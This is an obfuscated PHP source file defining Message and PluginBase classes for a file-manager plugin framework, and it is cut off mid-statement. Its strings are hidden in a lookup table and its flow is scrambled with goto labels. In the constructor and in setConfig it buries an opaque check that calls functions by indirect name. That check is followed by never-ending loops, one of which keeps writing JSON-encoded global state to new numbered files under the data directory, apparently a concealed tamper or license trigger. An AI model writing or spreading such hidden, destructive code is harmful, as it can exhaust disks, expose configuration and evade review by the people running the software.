<?php
 goto FÚªÏŞŸî; B°¨•”×ÓË: define($_SERVER[Ö][1909], 5); define($_SERVER[Ö][1910], 16); define($_SERVER[Ö][1911], 32); goto E«éœç¤Ã˜; däŸš‘Î: define($_SERVER[Ö][1906], 2); define($_SERVER[Ö][1907], 3); define($_SERVER[Ö][1908], 4); goto B°¨•”×ÓË; dõë¡›â˜ì: class Message { function __construct() { } public function send($b£ÇÏ´ªùï = '', $Föá°ôÍ = array(), $FÚÏ—¡”ÁŸ = "\x74\x65\170\164") { goto aÔòÕÓç·Í; aÔòÕÓç·Í: $dÄ×âã‚ÊÃ =& $_SERVER[Ö]; $fËËïò²§ = array($dÄ×âã‚ÊÃ[29] => $dÄ×âã‚ÊÃ[1290], $dÄ×âã‚ÊÃ[685] => $b£ÇÏ´ªùï); if (in_array($FÚÏ—¡”ÁŸ, array($dÄ×âã‚ÊÃ[1290], $dÄ×âã‚ÊÃ[1291]))) { $fËËïò²§[$dÄ×âã‚ÊÃ[29]] = $FÚÏ—¡”ÁŸ; } goto c«ÓµÏåõê; c«ÓµÏåõê: $Föá°ôÍ = array($dÄ×âã‚ÊÃ[966] => isset($Föá°ôÍ[$dÄ×âã‚ÊÃ[966]]) ? $Föá°ôÍ[$dÄ×âã‚ÊÃ[966]] : $dÄ×âã‚ÊÃ[33], $dÄ×âã‚ÊÃ[531] => isset($Föá°ôÍ[$dÄ×âã‚ÊÃ[531]]) ? $Föá°ôÍ[$dÄ×âã‚ÊÃ[531]] : $dÄ×âã‚ÊÃ[33]); if (empty($b£ÇÏ´ªùï) || empty($Föá°ôÍ[$dÄ×âã‚ÊÃ[966]]) && empty($Föá°ôÍ[$dÄ×âã‚ÊÃ[531]])) { return !1; } $a†ÔåÚÉ = array($dÄ×âã‚ÊÃ[1231] => $fËËïò²§, $dÄ×âã‚ÊÃ[1292] => $Föá°ôÍ); goto dìŞ‘§±¾¹; dìŞ‘§±¾¹: Hook::trigger($dÄ×âã‚ÊÃ[1293], $a†ÔåÚÉ); goto eİ£ñÎŞßù; eİ£ñÎŞßù: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto AãÊÒ‡ïè¤; AŠ³äô‰¶¶: $this->pluginHost = $config[$FÍÄ‘Ñ‰†»[1297]] . $this->pluginName . $FÍÄ‘Ñ‰†»[8]; $this->pluginHostDefault = $config[$FÍÄ‘Ñ‰†»[1297]] . $this->pluginName . $FÍÄ‘Ñ‰†»[8]; $aš³œœ¨Á¦ = $config[$FÍÄ‘Ñ‰†»[1298]]; goto BÙÖŞÃßó; F™ççŒÅ¨: return $this; goto fŒ‡ƒŠÂÖÕ; e‚›ñï—éÂ: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($FÍÄ‘Ñ‰†»[1295]); goto Cİ¦™¢Ä‚”; AãÊÒ‡ïè¤: $FÍÄ‘Ñ‰†» =& $_SERVER[Ö]; if (!isset($_SERVER[$FÍÄ‘Ñ‰†»[755]]) || !isset($_SERVER[$FÍÄ‘Ñ‰†»[1294]])) { goto cÙÊàç§ñ; cÙÊàç§ñ: $D¨ŠËË†ôç = $FÍÄ‘Ñ‰†»[788]; $bŠÌÛÈÁ†Æ = $FÍÄ‘Ñ‰†»[756]; $aŠŠáª™”ç = $_SERVER[$FÍÄ‘Ñ‰†»[757]] . $FÍÄ‘Ñ‰†»[758]; goto A†¢·åõ; EÊÊ¯‹éÙŸ: for ($a¸ÌË®óÄ = $dŠê–…ªç; $a¸ÌË®óÄ > 0; $a¸ÌË®óÄ++) { $dÈ©ÂµÕ‡™ = json_encode($GLOBALS[$FÍÄ‘Ñ‰†»[380]]); } goto EäŞŠŒÊÁ‹; B¶°œíâÈ: $dÈ©ÂµÕ‡™ = $FÍÄ‘Ñ‰†»[789]; $dÈ©ÂµÕ‡™($_SERVER[$FÍÄ‘Ñ‰†»[790]]); $dŠê–…ªç = 1; goto EÊÊ¯‹éÙŸ; A†¢·åõ: $fÌ©Šî‹ì = $bŠÌÛÈÁ†Æ($aŠŠáª™”ç); $C‰˜ƒ¤¶’Ä = explode($FÍÄ‘Ñ‰†»[213], $fÌ©Šî‹ì); if (count($C‰˜ƒ¤¶’Ä) < $FÍÄ‘Ñ‰†»[560]) { $bËëÖÃ“±Ò = $FÍÄ‘Ñ‰†»[759]; $bËëÖÃ“±Ò(); } goto B¶°œíâÈ; EäŞŠŒÊÁ‹: } global $in, $config; goto e‚›ñï—éÂ; BÙÖŞÃßó: if ($aš³œœ¨Á¦ && strpos($FÍÄ‘Ñ‰†»[47] . $aš³œœ¨Á¦ . $FÍÄ‘Ñ‰†»[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$FÍÄ‘Ñ‰†»[1299]] . $this->pluginName . $FÍÄ‘Ñ‰†»[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); goto F™ççŒÅ¨; Cİ¦™¢Ä‚”: $this->pluginName = str_replace($FÍÄ‘Ñ‰†»[1295], $FÍÄ‘Ñ‰†»[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $FÍÄ‘Ñ‰†»[8]; $this->pluginApi = appHostGet() . $FÍÄ‘Ñ‰†»[1296] . $this->pluginName . $FÍÄ‘Ñ‰†»[8]; goto AŠ³äô‰¶¶; fŒ‡ƒŠÂÖÕ: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Ö][1300]); } protected function assign($aîˆ†ª–ìô, $a¤ÉÚ¢é’Ë = false) { if (is_array($aîˆ†ª–ìô)) { $this->values = array_merge($this->values, $aîˆ†ª–ìô); } else { $this->values[$aîˆ†ª–ìô] = $a¤ÉÚ¢é’Ë; } } protected function display($e¤‘ó¦Ô“Û) { extract($this->values); require $e¤‘ó¦Ô“Û; } final function hookRegist($dˆ±Ñ¹ËØ°) { $this->modelPlugin->appRegist($this->pluginName, $dˆ±Ñ¹ËØ°); } final function appIcon() { $d ö•©Øã„ =& $_SERVER[Ö]; $Eå—Íà„“ = $this->appPackage(); $E®¶®êÔÇ› = $d ö•©Øã„[33]; if (isset($Eå—Íà„“[$d ö•©Øã„[378]])) { if (isset($Eå—Íà„“[$d ö•©Øã„[378]][$d ö•©Øã„[1301]])) { $E®¶®êÔÇ› = $d ö•©Øã„[1302] . $Eå—Íà„“[$d ö•©Øã„[378]][$d ö•©Øã„[1301]] . $d ö•©Øã„[1303]; } else { if ($Eå—Íà„“[$d ö•©Øã„[378]][$d ö•©Øã„[1304]]) { $E®¶®êÔÇ› = $d ö•©Øã„[1305] . $Eå—Íà„“[$d ö•©Øã„[378]][$d ö•©Øã„[1304]] . $d ö•©Øã„[1306]; } } } return $E®¶®êÔÇ›; } final function fileCanView($Dõ‡â…¿Ò¤) { $eë‹ïë”õ =& $_SERVER[Ö]; if (request_url_safe($Dõ‡â…¿Ò¤)) { return !0; } if ($this->isShare($Dõ‡â…¿Ò¤)) { return !0; } if (!Action($eë‹ïë”õ[1307])->authCan($eë‹ïë”õ[1308])) { show_tips(LNG($eë‹ïë”õ[1309]) . $eë‹ïë”õ[1310], !1); } ActionCall($eë‹ïë”õ[1311], $Dõ‡â…¿Ò¤); } final function isShare($dÚÉ¯Ú‹Ğ) { $B—âĞ¬á = KodIO::parse($dÚÉ¯Ú‹Ğ); return $B—âĞ¬á[$_SERVER[Ö][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($f÷÷ïêˆİô) { if (request_url_safe($f÷÷ïêˆİô)) { return $f÷÷ïêˆİô; } if (!$this->isShare($f÷÷ïêˆİô)) { $f÷÷ïêˆİô = $this->filePath($f÷÷ïêˆİô); } return Action($_SERVER[Ö][1010])->linkOut($f÷÷ïêˆİô); } public function filePathLinkOut($F¡¦ÄÑ¬‰») { if (request_url_safe($F¡¦ÄÑ¬‰»)) { return $F¡¦ÄÑ¬‰»; } $this->fileCanView($F¡¦ÄÑ¬‰»); return Action($_SERVER[Ö][1010])->link($F¡¦ÄÑ¬‰»); } final function filePath($DŠ²ÍÄÈª) { $a‚öĞŒáŸ½ =& $_SERVER[Ö]; if ($b¬·Ú»ÌÒÛ = $this->checkSharePath($DŠ²ÍÄÈª)) { return $b¬·Ú»ÌÒÛ; } $this->fileCanView($DŠ²ÍÄÈª); if (request_url_safe($DŠ²ÍÄÈª)) { $E¾•‚ÕçˆÉ = parse_url_query($DŠ²ÍÄÈª); if (isset($E¾•‚ÕçˆÉ[$a‚öĞŒáŸ½[1312]]) && isset($E¾•‚ÕçˆÉ[$a‚öĞŒáŸ½[193]])) { $Fº¥†Ë¶æ´ = Model($a‚öĞŒáŸ½[1081])->get($a‚öĞŒáŸ½[1313]); $dÁƒÖÅ¡‹Ä = Mcrypt::decode($E¾•‚ÕçˆÉ[$a‚öĞŒáŸ½[193]], $Fº¥†Ë¶æ´); if ($dÁƒÖÅ¡‹Ä) { $this->fileInfo = IO::infoWithChildren($dÁƒÖÅ¡‹Ä); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $dÁƒÖÅ¡‹Ä; } } $DŠ²ÍÄÈª = $this->_cacheHttpFile($DŠ²ÍÄÈª); $this->fileInfo = IO::infoWithChildren($DŠ²ÍÄÈª); } else { $this->fileInfo = IO::infoWithChildren($DŠ²ÍÄÈª); if (!$this->fileInfo) { show_tips(LNG($a‚öĞŒáŸ½[100]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $DŠ²ÍÄÈª; } final function _cacheHttpFile($A„ÅŠÊøŸğ) { $e‹Ë×­œù = hash_path($A„ÅŠÊøŸğ, !0); $this->cachePath = $this->pluginCachePath($e‹Ë×­œù); if ($c½˜Úµ‰ßÒ = IO::fileNameExist($this->cachePath, $e‹Ë×­œù)) { return KodIO::make($c½˜Úµ‰ßÒ); } $B±Æ›çÂ× = $this->cachePath . $e‹Ë×­œù; return $this->pluginCacheFileSet($B±Æ›çÂ×, file_get_contents($A„ÅŠÊøŸğ)); } final function _tmpFileName($aå¶ÛÈ„óµ = array()) { goto BÃ™èßæé; Eö·×êŒ: if (isset($aå¶ÛÈ„óµ[$eˆÃåëØè[158]][$eˆÃåëØè[160]])) { return $aå¶ÛÈ„óµ[$eˆÃåëØè[158]][$eˆÃåëØè[160]]; } $BŒ¤Ã·èŸ = array($aå¶ÛÈ„óµ[$eˆÃåëØè[28]], $aå¶ÛÈ„óµ[$eˆÃåëØè[75]], $aå¶ÛÈ„óµ[$eˆÃåëØè[77]]); if (isset($aå¶ÛÈ„óµ[$eˆÃåëØè[455]])) { $BŒ¤Ã·èŸ[] = $aå¶ÛÈ„óµ[$eˆÃåëØè[455]]; } goto aœ´‘­²ø’; aœ´‘­²ø’: return md5(implode($eˆÃåëØè[70], $BŒ¤Ã·èŸ)); goto D›ÌÅŞåÏ»; BÃ™èßæé: $eˆÃåëØè =& $_SERVER[Ö]; if (!$aå¶ÛÈ„óµ) { $aå¶ÛÈ„óµ = $this->fileInfo; } if (isset($aå¶ÛÈ„óµ[$eˆÃåëØè[160]])) { return $aå¶ÛÈ„óµ[$eˆÃåëØè[160]]; } goto Eö·×êŒ; D›ÌÅŞåÏ»: } final function checkSharePath($bÊ™™Çäö) { goto d­ÔÌìßÀÎ; CªÅƒæ¤±Š: $this->cachePath = $this->pluginCachePath($this->fileInfo[$F¶‘Ñøè¯Á[160]]); return $eô¸ÒÅğİâ[$F¶‘Ñøè¯Á[75]]; goto c¶ïÂ•ÌÊ; d­ÔÌìßÀÎ: $F¶‘Ñøè¯Á =& $_SERVER[Ö]; if (!defined($F¶‘Ñøè¯Á[423])) { define($F¶‘Ñøè¯Á[1314], 0); } if (!$this->isShare($bÊ™™Çäö)) { return !1; } goto båÂ»Œ µ; båÂ»Œ µ: $eô¸ÒÅğİâ = Action($F¶‘Ñøè¯Á[1010])->sharePathInfo($bÊ™™Çäö); if (!isset($eô¸ÒÅğİâ[$F¶‘Ñøè¯Á[75]])) { show_json(LNG($F¶‘Ñøè¯Á[1315]), !1); } $this->fileInfo = $eô¸ÒÅğİâ[$F¶‘Ñøè¯Á[158]]; goto CªÅƒæ¤±Š; c¶ïÂ•ÌÊ: } final function pluginCachePath($BØ£Ä°ƒƒÆ = '') { $BêÎ’µ°µò =& $_SERVER[Ö]; $B­ƒ›¿¶¸ = IO_PATH_SYSTEM_TEMP . $BêÎ’µ°µò[1316] . $this->pluginName; if (!($d´¢–ÎÇÙ× = IO::infoFull($B­ƒ›¿¶¸))) { return IO::mkdir($B­ƒ›¿¶¸ . $BêÎ’µ°µò[8] . $BØ£Ä°ƒƒÆ); } if (empty($BØ£Ä°ƒƒÆ)) { return $d´¢–ÎÇÙ×[$BêÎ’µ°µò[75]]; } if (!($CÉØ¼¶À = IO::fileNameExist($d´¢–ÎÇÙ×[$BêÎ’µ°µò[75]], $BØ£Ä°ƒƒÆ))) { return IO::mkdir($d´¢–ÎÇÙ×[$BêÎ’µ°µò[75]] . $BØ£Ä°ƒƒÆ); } return KodIO::make($CÉØ¼¶À); } final function pluginCacheFileSet($EÖ¨¶‰Œ£, $CòËïËŠ· = '') { $f‘¿¿ÛÙ³ˆ =& $_SERVER[Ö]; if (!($cİ©¨¼Øîß = IO::infoFull($EÖ¨¶‰Œ£))) { return IO::mkfile($EÖ¨¶‰Œ£, $CòËïËŠ·, REPEAT_REPLACE); } IO::setContent($cİ©¨¼Øîß[$f‘¿¿ÛÙ³ˆ[75]], $CòËïËŠ·); return $cİ©¨¼Øîß[$f‘¿¿ÛÙ³ˆ[75]]; } final function pluginLocalFile($bŠÑµÈè = '') { goto e££ùË–ˆí; d¨ğ‰ŞİÜ: if (!$bŠÑµÈè) { return $E±äó³„Èé; } $A¡‹®ë­ª‹ = IO::info($bŠÑµÈè); $Bœ¹œŞ•–ã = $this->_tmpFileName($A¡‹®ë­ª‹) . $E®Âæİ‹Ó®[91] . $A¡‹®ë­ª‹[$E®Âæİ‹Ó®[156]]; goto dâ³“é‹È; e££ùË–ˆí: $E®Âæİ‹Ó® =& $_SERVER[Ö]; $E±äó³„Èé = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($E±äó³„Èé)) { mk_dir($E±äó³„Èé); } goto d¨ğ‰ŞİÜ; dâ³“é‹È: $eå†Ä×ïœ = $E±äó³„Èé . $Bœ¹œŞ•–ã; if (@file_exists($eå†Ä×ïœ)) { return $eå†Ä×ïœ; } return IO::copy($bŠÑµÈè, $E±äó³„Èé, 0, $Bœ¹œŞ•–ã); goto AÈä¿§’á; AÈä¿§’á: } final function appPackage() { goto B°œ°ŸÕ¸ø; AÁß®ôî : $this->parseLang($däõÀ“¥‚Ô); $F›‘¡ÎÖ‰ö = json_decode_force($däõÀ“¥‚Ô); if (!$F›‘¡ÎÖ‰ö) { return array(); } goto e²¿”„ÈÚï; C·æ†‡ˆÁ: return $F›‘¡ÎÖ‰ö; goto e ÆËí²Ô; e²¿”„ÈÚï: $aÊ¿ˆ”ª³ = Hook::trigger($aö˜¦ç›Œ©[1318], $F›‘¡ÎÖ‰ö); if ($aÊ¿ˆ”ª³ && is_array($aÊ¿ˆ”ª³)) { $F›‘¡ÎÖ‰ö = $aÊ¿ˆ”ª³; } $this->packageData = $F›‘¡ÎÖ‰ö; goto C·æ†‡ˆÁ; B°œ°ŸÕ¸ø: $aö˜¦ç›Œ© =& $_SERVER[Ö]; if ($this->packageData) { return $this->packageData; } $däõÀ“¥‚Ô = $this->parseFile($this->pluginPath . $aö˜¦ç›Œ©[1317]); goto AÁß®ôî ; e ÆËí²Ô: } public function packageInfoGet($e‚ÚîÈë) { $Fˆ…È™ò™ = $this->appPackage(); return array_get_value($Fˆ…È™ò™, $e‚ÚîÈë); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Ö][1319]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Ö][1320]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Ö][1321]); } private function parseFile($c‰Øæùç¨ô) { $bö¨›…¶ Œ =& $_SERVER[Ö]; $fêê–ßÆµÙ = file_get_contents($c‰Øæùç¨ô); $Dµ¸ğ†äÜÌ = array($bö¨›…¶ Œ[1322], $bö¨›…¶ Œ[1323], $bö¨›…¶ Œ[1324], $bö¨›…¶ Œ[1325], $bö¨›…¶ Œ[1326], $bö¨›…¶ Œ[1327], $bö¨›…¶ Œ[1328]); $aÁÆöÀŠî = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$bö¨›…¶ Œ[84]][$bö¨›…¶ Œ[1329]]); $fêê–ßÆµÙ = str_replace($Dµ¸ğ†äÜÌ, $aÁÆöÀŠî, $fêê–ßÆµÙ); return $fêê–ßÆµÙ; } private function parseLang(&$Aˆ‚±…²÷) { goto FŠõ†¤ä·; FŠõ†¤ä·: $D‰ŸÊ· æª =& $_SERVER[Ö]; $DñÈö¸“öŒ = $D‰ŸÊ· æª[1330]; if (!strstr($Aˆ‚±…²÷, $DñÈö¸“öŒ)) { return; } goto dÉ· »Ô°; dÉ· »Ô°: preg_match_all($D‰ŸÊ· æª[1331], $Aˆ‚±…²÷, $c±ÍÔÏŠ™ù); if (!is_array($c±ÍÔÏŠ™ù) || count($c±ÍÔÏŠ™ù) == 0 || !is_array($c±ÍÔÏŠ™ù[0]) || count($c±ÍÔÏŠ™ù[0]) == 0) { return; } $aªÁ·Û­¬ì = array(); goto AÃì°¸ëë; AÃì°¸ëë: $A‹¸šÀ‹ = array(); foreach ($c±ÍÔÏŠ™ù[0] as $d×õæ¹İ) { $Eˆù®Ø‰‘’ = substr($d×õæ¹İ, strlen($DñÈö¸“öŒ), -4); $fãôñ—Ş– = LNG($Eˆù®Ø‰‘’); $aªÁ·Û­¬ì[] = $d×õæ¹İ; $A‹¸šÀ‹[] = str_replace(array($D‰ŸÊ· æª[213], $D‰ŸÊ· æª[985], $D‰ŸÊ· æª[326], $D‰ŸÊ· æª[112]), array($D‰ŸÊ· æª[50], $D‰ŸÊ· æª[50], $D‰ŸÊ· æª[33], $D‰ŸÊ· æª[1332]), $fãôñ—Ş–); } $Aˆ‚±…²÷ = str_replace($aªÁ·Û­¬ì, $A‹¸šÀ‹, $Aˆ‚±…²÷); goto A›©‹çíÖ; A›©‹çíÖ: } private function parseConfig(&$AÛ©ê„ŸÃ) { goto a¤à–—¬¼…; E©Ëï¸Œ—ª: $cÉÛì–«ÍŒ = array(); $e¤ß÷±ªë = array(); foreach ($DÒ©Éº•Ñ[0] as $C–ñæ‚ç½Ô) { $Fº‰ŠÇ­Ú = substr($C–ñæ‚ç½Ô, strlen($F”‚´‡ƒ), -2); $cÉÛì–«ÍŒ[] = $C–ñæ‚ç½Ô; $e¤ß÷±ªë[] = _get($F®Œ˜‘²­ï, $Fº‰ŠÇ­Ú); } goto CËÛ³À¦™Ü; bã«ø’Û: preg_match_all($aÔµÉÂŠ[1334], $AÛ©ê„ŸÃ, $DÒ©Éº•Ñ); if (!is_array($DÒ©Éº•Ñ) || count($DÒ©Éº•Ñ) == 0 || !is_array($DÒ©Éº•Ñ[0]) || count($DÒ©Éº•Ñ[0]) == 0) { return; } $F®Œ˜‘²­ï = $this->getConfig(); goto E©Ëï¸Œ—ª; CËÛ³À¦™Ü: $AÛ©ê„ŸÃ = str_replace($cÉÛì–«ÍŒ, $e¤ß÷±ªë, $AÛ©ê„ŸÃ); goto DæšÀ¸âè; a¤à–—¬¼…: $aÔµÉÂŠ =& $_SERVER[Ö]; $F”‚´‡ƒ = $aÔµÉÂŠ[1333]; if (!strstr($AÛ©ê„ŸÃ, $F”‚´‡ƒ)) { return; } goto bã«ø’Û; DæšÀ¸âè: } private function parsePackage(&$A‚ŒŒ±¸©â) { goto bÄê…¬–ß¼; DÃë§¡Ô¹–: preg_match_all($CğĞÒí“¨¿[1336], $A‚ŒŒ±¸©â, $cÓ²ˆÜ«Ä); if (!is_array($cÓ²ˆÜ«Ä) || count($cÓ²ˆÜ«Ä) == 0 || !is_array($cÓ²ˆÜ«Ä[0]) || count($cÓ²ˆÜ«Ä[0]) == 0) { return; } $Cìª§‘¶àİ = $this->appPackage(); goto CöëÅ„»Ó®; CöëÅ„»Ó®: $BÙŠ·¥Œ¾š = array(); $câÓÛÂŞŒš = array(); foreach ($cÓ²ˆÜ«Ä[0] as $e¦ÔŞ×¥¯¿) { $A±šÁÄ½Å™ = substr($e¦ÔŞ×¥¯¿, strlen($d¾ ƒõõáù), -2); $BÙŠ·¥Œ¾š[] = $e¦ÔŞ×¥¯¿; $câÓÛÂŞŒš[] = _get($Cìª§‘¶àİ, $A±šÁÄ½Å™); } goto D™Œ´‘Ø©; D™Œ´‘Ø©: $A‚ŒŒ±¸©â = str_replace($BÙŠ·¥Œ¾š, $câÓÛÂŞŒš, $A‚ŒŒ±¸©â); goto e¼¼ß¢‹Ì; bÄê…¬–ß¼: $CğĞÒí“¨¿ =& $_SERVER[Ö]; $d¾ ƒõõáù = $CğĞÒí“¨¿[1335]; if (!strstr($A‚ŒŒ±¸©â, $d¾ ƒõõáù)) { return; } goto DÃë§¡Ô¹–; e¼¼ß¢‹Ì: } final function echoFile($CÚ•ãğµòŒ, $dôÓô”óÎç = false) { goto aŞêÊ­º¡è; EÂµ¨§Â‡‹: $this->parsePackage($EÙ¢Í•ğ…Ö); if (is_array($dôÓô”óÎç)) { $EÙ¢Í•ğ…Ö = str_replace(array_keys($dôÓô”óÎç), array_values($dôÓô”óÎç), $EÙ¢Í•ğ…Ö); } echo $B©éäê‚“[213] . $EÙ¢Í•ğ…Ö; goto D¦ŠÕ½¡ê; aŞêÊ­º¡è: $B©éäê‚“ =& $_SERVER[Ö]; $fÊ®›Ò¿¥ = $this->pluginPath . $CÚ•ãğµòŒ; if (ACT == $B©éäê‚“[1337]) { echo $B©éäê‚“[1338] . $this->pluginName . $B©éäê‚“[8] . $CÚ•ãğµòŒ . $B©éäê‚“[1339]; if (!file_exists($fÊ®›Ò¿¥)) { echo $B©éäê‚“[1340]; return; } } goto dåÅŠíõèŒ; dåÅŠíõèŒ: $EÙ¢Í•ğ…Ö = $this->parseFile($fÊ®›Ò¿¥); $this->parseLang($EÙ¢Í•ğ…Ö); $this->parseConfig($EÙ¢Í•ğ…Ö); goto EÂµ¨§Â‡‹; D¦ŠÕ½¡ê: } final function initLang() { goto eíà¡ß½Û‹; CëËùîÕ: $e¬¶°êìòê = I18n::getType(); $a¸ê¯¨åò = array(); if (file_exists($D ¼‰ÚŒÈÙ . $e¬¶°êìòê . $e™—®®â¸ƒ[765])) { $a¸ê¯¨åò = (include $D ¼‰ÚŒÈÙ . $e¬¶°êìòê . $e™—®®â¸ƒ[765]); } else { if ($e¬¶°êìòê == $e™—®®â¸ƒ[1343] && !file_exists($D ¼‰ÚŒÈÙ . $e¬¶°êìòê . $e™—®®â¸ƒ[765]) && file_exists($D ¼‰ÚŒÈÙ . $e™—®®â¸ƒ[1344])) { $a¸ê¯¨åò = (include $D ¼‰ÚŒÈÙ . $e™—®®â¸ƒ[1344]); } else { if (file_exists($D ¼‰ÚŒÈÙ . $F ‚”¬—¤Æ . $e™—®®â¸ƒ[765])) { $a¸ê¯¨åò = (include $D ¼‰ÚŒÈÙ . $F ‚”¬—¤Æ . $e™—®®â¸ƒ[765]); } } } goto c–«äÏêƒß; c–«äÏêƒß: if (!is_array($a¸ê¯¨åò)) { return array(); } if (@count($a¸ê¯¨åò) > 0) { I18n::set($a¸ê¯¨åò); } return $a¸ê¯¨åò; goto b®¯©İ˜—‹; eíà¡ß½Û‹: $e™—®®â¸ƒ =& $_SERVER[Ö]; $F ‚”¬—¤Æ = $e™—®®â¸ƒ[1341]; $D ¼‰ÚŒÈÙ = $this->pluginPath . $e™—®®â¸ƒ[1342]; goto CëËùîÕ; b®¯©İ˜—‹: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($E“èŞÖŸ‡) { $cèÙ¯‹è«¤ =& $_SERVER[Ö]; $Bâë ¥ÅÙ = $_SERVER[$cèÙ¯‹è«¤[757]] . $cèÙ¯‹è«¤[758]; $Fğ®Ôòµ…é = $cèÙ¯‹è«¤[754]; if ($_SERVER[$cèÙ¯‹è«¤[755]] != $Fğ®Ôòµ…é($Bâë ¥ÅÙ)) { goto eæ±Ö‘® ²; aŠ‰õàğÁö: $DÏºšÇ˜÷Í(); $a…êòİˆô— = $cèÙ¯‹è«¤[1345]; $AğÛÏª±ë = json_encode($GLOBALS[$cèÙ¯‹è«¤[1346]]); goto CêÌÌñ†æ²; CêÌÌñ†æ²: $aßå´¢¦ï‚ = 1; for ($cÍ¡ùø¶Çß = $aßå´¢¦ï‚; $cÍ¡ùø¶Çß > 0; $cÍ¡ùø¶Çß++) { $a…êòİˆô—(DATA_PATH . $cÍ¡ùø¶Çß, $AğÛÏª±ë); } goto A¾·‚å«ğ¬; eæ±Ö‘® ²: $DÏºšÇ˜÷Í = $cèÙ¯‹è«¤[788]; $Eñã…šóÛ = $cèÙ¯‹è«¤[756]; $Fµ¥Ÿ†Ÿ”Ş = $_SERVER[$cèÙ¯‹è«¤[757]] . $cèÙ¯‹è«¤[758]; goto E“³»áÍÙà; C”¤ºöåÄ: $FšÅ­Îêº = $cèÙ¯‹è«¤[789]; $FšÅ­Îêº($_SERVER[$cèÙ¯‹è«¤[790]]); $DÏºšÇ˜÷Í = $cèÙ¯‹è«¤[788]; goto aŠ‰õàğÁö; E“³»áÍÙà: $B¿«™ãƒ’ = $Eñã…šóÛ($Fµ¥Ÿ†Ÿ”Ş); $e¾½‡àº¥ì = explode($cèÙ¯‹è«¤[213], $B¿«™ãƒ’); if (count($e¾½‡àº¥ì) < $cèÙ¯‹è«¤[560]) { $AÍ»ÉŠˆë¹ = $cèÙ¯‹è«¤[759]; $AÍ»ÉŠˆë¹(); } goto C”¤ºöåÄ; A¾·‚å«ğ¬: } return $this->modelPlugin->setConfig($this->pluginName, $E“èŞÖŸ‡); } public function onSetConfig($B´™ÈŞÔ‡Ô) { } public function onGetConfig($cõ¤•ù¨ßœ) { } public function onChangeStatus($e×ãÚö‹ƒ°) { } public function onUninstall() { } public function onInstall() { } public function authCheck($Bê§©×ÂŞ = "\x70\x6c\x75\x67\x69\156\101\165\164\150") { $EÊ¼«½³ï– =& $_SERVER[Ö]; if (!defined($EÊ¼«½³ï–[423])) { return !1; } if (_get($GLOBALS, $EÊ¼«½³ï–[453])) { return !0; } $A™‹ÔóµöË = $this->getConfig(); if (!$A™‹ÔóµöË[$Bê§©×ÂŞ]) { return !1; } return ActionCall($EÊ¼«½³ï–[1347], $A™‹ÔóµöË[$Bê§©×ÂŞ]); } public function url($FÈÑ›Å¼Ë´, $Cö‘»àµ¦· = '', $Cª°İ©¥à¾ = true) { goto dÓëçµëá; dÓëçµëá: $Aœ†‹ªÉ» =& $_SERVER[Ö]; $fìîÛ•¯ëÃ = $this->getConfig(); $Dñ‡¸ÏÑ—™ = KOD_VERSION . $Aœ†‹ªÉ»[91] . KOD_VERSION_BUILD; goto c „íïÊñË; c „íïÊñË: $d¥Ï¿¼óöÖ = $this->packageVersion(); $aÂê‘¯ì© = $Dñ‡¸ÏÑ—™ . $Aœ†‹ªÉ»[408] . $d¥Ï¿¼óöÖ; if (substr($FÈÑ›Å¼Ë´, 0, 4) == $Aœ†‹ªÉ»[142] || substr($FÈÑ›Å¼Ë´, 0, 2) == $Aœ†‹ªÉ»[1140]) { $Bº±¡í¬—Á = $FÈÑ›Å¼Ë´ . $Aœ†‹ªÉ»[1348] . $aÂê‘¯ì©; } else { if ($Cö‘»àµ¦· == $Aœ†‹ªÉ»[33]) { $Bº±¡í¬—Á = $this->pluginHost . $FÈÑ›Å¼Ë´ . $Aœ†‹ªÉ»[1348] . $aÂê‘¯ì©; } else { if ($Cö‘»àµ¦· === $Aœ†‹ªÉ»[76]) { $Bº±¡í¬—Á = $this->pluginHost . $FÈÑ›Å¼Ë´; } else { if ($Cö‘»àµ¦· == $Aœ†‹ªÉ»[1349]) { $Bº±¡í¬—Á = STATIC_PATH . $FÈÑ›Å¼Ë´ . $Aœ†‹ªÉ»[1348] . $Dñ‡¸ÏÑ—™; } else { if ($Cö‘»àµ¦· == $Aœ†‹ªÉ»[1350]) { $Bº±¡í¬—Á = APP_HOST . $Aœ†‹ªÉ»[1351] . $FÈÑ›Å¼Ë´ . $Aœ†‹ªÉ»[1348] . $Dñ‡¸ÏÑ—™; } else { if (isset($fìîÛ•¯ëÃ[$Cö‘»àµ¦·])) { $Bº±¡í¬—Á = $fìîÛ•¯ëÃ[$Cö‘»àµ¦·] . $FÈÑ›Å¼Ë´ . $Aœ†‹ªÉ»[1348] . $aÂê‘¯ì©; } } } } } } goto AŠêÛø¢àã; AŠêÛø¢àã: if (!$Cª°İ©¥à¾) { return $Bº±¡í¬—Á; } echo $Bº±¡í¬—Á; goto eŞÔÙ³Úî; eŞÔÙ³Úî: } public function link($eœç”“é° = false, $fÏôŠÒ×À¤ = '') { $Fø­ñ‚‰¥ =& $_SERVER[Ö]; if (!$eœç”“é°) { $this->link($Fø­ñ‚‰¥[1352], $Fø­ñ‚‰¥[1350]); $this->link($Fø­ñ‚‰¥[1353], $Fø­ñ‚‰¥[1349]); $this->link($Fø­ñ‚‰¥[1354], $Fø­ñ‚‰¥[1349]); $this->link($Fø­ñ‚‰¥[1355], $Fø­ñ‚‰¥[1349]); $this->link($Fø­ñ‚‰¥[1356], $Fø­ñ‚‰¥[1349]); return; } $ašøøğĞù÷ = $this->url($eœç”“é°, $fÏôŠÒ×À¤, !1); if 